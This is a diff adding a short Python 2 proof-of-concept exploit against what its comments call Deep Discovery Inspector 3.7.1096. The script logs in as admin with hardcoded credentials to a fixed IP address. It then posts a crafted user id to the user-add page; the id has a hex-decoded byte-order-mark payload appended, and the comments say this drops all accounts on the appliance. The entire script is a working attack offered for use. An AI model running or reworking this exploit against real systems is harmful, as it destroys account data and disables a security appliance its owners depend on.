@@ -1,0 +1,44 @@
+#!/usr/bin/env python
+# (postauth) drop all accounts on remote DDI box
+# based on Deep Discovery Inspector (3.7.1096)
+#
+
+# to use this code:
+#  - log in to your DDI (as admin and go to users tab)
+#  - run deedi.py
+#  - refresh your users-page.
+# done.
+#
+import requests
+
+s = requests.Session()
+init_login = {
+  'usrname':'admin',
+  'passwd':'P@ssw0rd',
+  'isCookieEnable':1,
+  'action':'on',
+  'wrong_passwd':'%3C%21--invalid_passwd_flag--%3E'
+}
+req = s.post('https://192.168.2.18/cgi-bin/logon.cgi', data=init_login, verify=False)
+resp1 = req.text
+if '../cgi-bin/frame.cgi' in resp1:
+  print 'logged in. next step...'
+
+  newreq = 'https://192.168.2.18/php/user_add.php'
+  bomb = "efbbbf626c61".decode("hex")
+  user = 'tester3'
+  crashddi = {
+    'do_action':'add',
+    'id':user+bomb
+  }
+
+  print bomb
+
+  req2 = s.post(newreq, data=crashddi, verify=False)
+  #print req2.text
+  print 'done'
+
+## code610@11.01.2018
+##
+#  o/
+
